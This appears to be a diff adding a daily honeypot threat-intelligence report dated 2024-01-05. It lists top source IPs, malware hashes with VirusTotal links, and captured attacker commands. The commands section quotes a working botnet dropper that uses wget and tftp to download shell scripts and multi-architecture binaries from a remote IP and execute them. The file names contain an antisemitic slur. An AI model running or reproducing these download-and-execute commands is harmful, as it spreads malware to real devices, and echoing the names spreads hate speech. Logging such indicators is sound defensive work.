@@ -1,0 +1,33 @@
+Top 5 IPs for 2024-01-05:
+
+153.122.199.88
+139.59.147.36
+47.180.136.243
+179.215.190.25
+87.225.88.9
+
+Malware download: 
+d88a42a33fabc1b1d761ada585006ad0c79b6918748328e8774774b2db3a3a8f
+https://www.virustotal.com/gui/file/d88a42a33fabc1b1d761ada585006ad0c79b6918748328e8774774b2db3a3a8f
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+
+
+Malicious commands seen:
+
+uname -a ; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.123.85.79/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 93.123.85.79 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 93.123.85.79; chmod 777 tftp2.sh; sh tftp2
+24 detections on VT: https://www.virustotal.com/gui/url/25a3e79afedb47247dd40bba8e96cacbbd6bd2055715ca33957d6a2a5a36b916/detection
+Content: 
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.mips;wget http://93.123.85.79/fuckjewishpeople.mips; chmod +x fuckjewishpeople.mips; ./fuckjewishpeople.mips; rm -rf fuckjewishpeople.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.mpsl;wget http://93.123.85.79/fuckjewishpeople.mpsl; chmod +x fuckjewishpeople.mpsl; ./fuckjewishpeople.mpsl; rm -rf fuckjewishpeople.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.x86;wget http://93.123.85.79/fuckjewishpeople.x86; chmod +x fuckjewishpeople.x86; ./fuckjewishpeople.x86; rm -rf fuckjewishpeople.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.ppc;wget http://93.123.85.79/fuckjewishpeople.ppc; chmod +x fuckjewishpeople.ppc; ./fuckjewishpeople.ppc; rm -rf fuckjewishpeople.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.sparc;wget http://93.123.85.79/fuckjewishpeople.sparc; chmod +x fuckjewishpeople.sparc; ./fuckjewishpeople.sparc; rm -rf fuckjewishpeople.sparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.arm4;wget http://93.123.85.79/fuckjewishpeople.arm4; chmod +x fuckjewishpeople.arm4; ./fuckjewishpeople.arm4; rm -rf fuckjewishpeople.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.arm5;wget http://93.123.85.79/fuckjewishpeople.arm5; chmod +x fuckjewishpeople.arm5; ./fuckjewishpeople.arm5; rm -rf fuckjewishpeople.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.arm6;wget http://93.123.85.79/fuckjewishpeople.arm6; chmod +x fuckjewishpeople.arm6; ./fuckjewishpeople.arm6; rm -rf fuckjewishpeople.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.arm7;wget http://93.123.85.79/fuckjewishpeople.arm7; chmod +x fuckjewishpeople.arm7; ./fuckjewishpeople.arm7; rm -rf fuckjewishpeople.arm7
+
